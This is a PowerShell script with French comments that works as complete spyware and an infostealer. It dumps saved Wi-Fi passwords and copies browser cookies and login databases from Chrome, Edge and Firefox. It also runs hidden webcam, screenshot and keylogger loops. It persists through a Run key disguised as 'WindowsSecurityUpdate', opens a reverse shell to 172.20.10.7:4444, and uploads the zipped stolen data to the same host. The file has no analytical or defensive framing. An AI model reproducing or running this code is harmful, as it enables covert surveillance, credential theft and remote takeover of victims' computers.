$ErrorActionPreference = "SilentlyContinue"

$OutputPath = "C:\Users\Public\collected_data"
New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null

# Dossiers pour les captures continue
New-Item -ItemType Directory -Path "$OutputPath\screenshots" -Force | Out-Null
New-Item -ItemType Directory -Path "$OutputPath\screen_share" -Force | Out-Null
New-Item -ItemType Directory -Path "$OutputPath\webcam" -Force | Out-Null
New-Item -ItemType Directory -Path "$OutputPath\browser_data" -Force | Out-Null

# === 1. INFOS SYSTEME ===
$system = @{
    Hostname        = $env:COMPUTERNAME
    Username        = $env:USERNAME
    Domain          = $env:USERDOMAIN
    OS              = (Get-WmiObject Win32_OperatingSystem).Caption
    OS_Version      = (Get-WmiObject Win32_OperatingSystem).Version
    Architecture    = $env:PROCESSOR_ARCHITECTURE
    Date            = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

$system | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\system.json" -Encoding UTF8

# === 2. UTILISATEURS LOCAUX ===
Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled, PasswordChangeable, PasswordExpires, PasswordRequired, SID | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\users.json" -Encoding UTF8

# === 3. RESEAUX ET IP ===
Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address, NetIPv4Interface | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\network.json" -Encoding UTF8

# === 4. MOTS DE PASSE WIFI ===
$wifiProfiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object { ($_ -split ":")[1].Trim() }
$wifiResults = @()

foreach ($profile in $wifiProfiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $key = ($details | Select-String "Contenu de la clé|Key Content") | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifiResults += @{
        SSID     = $profile
        Password = $key
    }
}

$wifiResults | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\wifi_passwords.json" -Encoding UTF8

# === 5. PROCESSUS ===
Get-Process | Select-Object Name, Id, Path, Company, CPU | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\processes.json" -Encoding UTF8

# === 6. PROGRAMMES INSTALLES ===
$programs = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$programs += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$programs | Where-Object { $_.DisplayName } | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\programs.json" -Encoding UTF8

# === 7. COOKIES ET SESSIONS NAVIGATEURS ===
function Copy-BrowserFiles {
    param($BrowserName, $ProfilePath, $ProcessName)
    
    if (Test-Path $ProfilePath) {
        # Fermer le navigateur pour deverrouiller les fichiers
        Stop-Process -Name $ProcessName -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        
        $dest = "$OutputPath\browser_data\$BrowserName"
        New-Item -ItemType Directory -Path $dest -Force | Out-Null
        
        $files = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Network")
        foreach ($file in $files) {
            $srcFile = Join-Path $ProfilePath $file
            if (Test-Path $srcFile) {
                Copy-Item $srcFile -Destination "$dest\$file" -Force
            }
        }
    }
}

Copy-BrowserFiles -BrowserName "Chrome" -ProfilePath "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" -ProcessName "chrome"
Copy-BrowserFiles -BrowserName "Edge" -ProfilePath "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -ProcessName "msedge"
Copy-BrowserFiles -BrowserName "Firefox" -ProfilePath "$env:APPDATA\Mozilla\Firefox\Profiles" -ProcessName "firefox"

# === 8. CAPTURE D'ECRAN UNIQUE ===
function Take-Screenshot {
    param($Path)
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    $bitmap.Save($Path)
    $graphics.Dispose()
    $bitmap.Dispose()
}

Take-Screenshot -Path "$OutputPath\screenshot.png"

# === 9. WEBCAM ===
$webcamScript = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Capture-Webcam {
    try {
        $filter = [System.String]::Empty
        $capture = New-Object System.Windows.Media.Capture.CameraCaptureUI
        # Fallback avec ffmpeg si dispo
        $ffmpeg = "C:\Users\Public\ffmpeg.exe"
        if (Test-Path $ffmpeg) {
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            & $ffmpeg -f dshow -i "video=0" -frames:v 1 "C:\Users\Public\collected_data\webcam\webcam_$timestamp.jpg" -y 2>$null
        }
    } catch {
        # Methode alternative via WIA
        try {
            $deviceManager = New-Object -ComObject WIA.DeviceManager
            if ($deviceManager.DeviceInfos.Count -gt 0) {
                $device = $deviceManager.DeviceInfos.Item(1).Connect()
                $image = $device.ExecuteCommand("{AF628761-1F2E-4C73-9D2C-76D1F1B4105E}")
                $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
                $image.SaveFile("C:\Users\Public\collected_data\webcam\webcam_$timestamp.jpg")
            }
        } catch {}
    }
}

while ($true) {
    Capture-Webcam
    Start-Sleep -Seconds 60
}
'@

$webcamScript | Out-File "C:\Users\Public\webcam.ps1" -Encoding UTF8
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -File C:\Users\Public\webcam.ps1"

# === 10. SCREENSHOTS TOUTES LES 30 SECONDES ===
$screenshotScript = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while ($true) {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $path = "C:\Users\Public\collected_data\screenshots\scr_$timestamp.png"
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    $bitmap.Save($path)
    $graphics.Dispose()
    $bitmap.Dispose()
    Start-Sleep -Seconds 30
}
'@

$screenshotScript | Out-File "C:\Users\Public\screenshot_loop.ps1" -Encoding UTF8
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -File C:\Users\Public\screenshot_loop.ps1"

# === 11. SCREEN SHARING (CAPTURE TOUTES LES 2 SECONDES) ===
$screenShareScript = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Garde seulement les 100 dernieres images pour eviter de remplir le disque
$maxFiles = 100
$folder = "C:\Users\Public\collected_data\screen_share"

while ($true) {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $path = "$folder\share_$timestamp.png"
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    $bitmap.Save($path)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    # Nettoyage des anciennes images
    Get-ChildItem $folder -File | Sort-Object LastWriteTime -Descending | Select-Object -Skip $maxFiles | Remove-Item -Force
    
    Start-Sleep -Seconds 2
}
'@

$screenShareScript | Out-File "C:\Users\Public\screen_share.ps1" -Encoding UTF8
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -File C:\Users\Public\screen_share.ps1"

# === 12. PERSISTENCE ===
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $path -Name "WindowsSecurityUpdate" -Value "powershell.exe -w hidden -ep bypass -File C:\Users\Public\p.ps1" -Force

# === 13. KEYLOGGER SEPARE ===
$keylogScript = @'
Add-Type -Name U -Namespace W -MemberDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);'
while ($true) {
    Start-Sleep -Milliseconds 30
    for ($i=9; $i -le 254; $i++) {
        if ([W.U]::GetAsyncKeyState($i) -eq -32767) {
            $key = [char]$i
            Add-Content -Path "C:\Users\Public\keylog.txt" -Value $key -NoNewline
        }
    }
}
'@

$keylogScript | Out-File "C:\Users\Public\keylogger.ps1" -Encoding UTF8
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -File C:\Users\Public\keylogger.ps1"
# === REVERSE SHELL ===
$reverseShellScript = @'
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("172.20.10.7", 4444)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | %{0}
        
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes, 0, $i)
            $sendback = (Invoke-Expression $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
            $x = ($sendback2.Normalize() -replace '\r','')
            $y = ([text.encoding]::ASCII).GetBytes($x)
            $stream.Write($y, 0, $y.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 30
    }
}
'@

$reverseShellScript | Out-File "C:\Users\Public\rs.ps1" -Encoding UTF8
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -File C:\Users\Public\rs.ps1"

# === 14. EXFILTRATION VERS LE SERVEUR ===
try {
    $zipPath = "C:\Users\Public\stolen_data.zip"
    $filesToZip = @("C:\Users\Public\collected_data", "C:\Users\Public\keylog.txt")
    
    # Supprimer l'ancien ZIP s'il existe
    if (Test-Path $zipPath) {
        Remove-Item $zipPath -Force
    }
    
    # Compresser les donnees
    Compress-Archive -Path $filesToZip -DestinationPath $zipPath -Force
    
    # Envoyer vers le serveur
    $web = New-Object System.Net.WebClient
    $web.UploadFile("http://172.20.10.7:8080/upload", $zipPath) | Out-Null
    
    Write-Output "[+] Exfiltration reussie"
} catch {
    Write-Output "[!] Erreur exfiltration : $_"
}

Write-Output "[+] Collection terminee"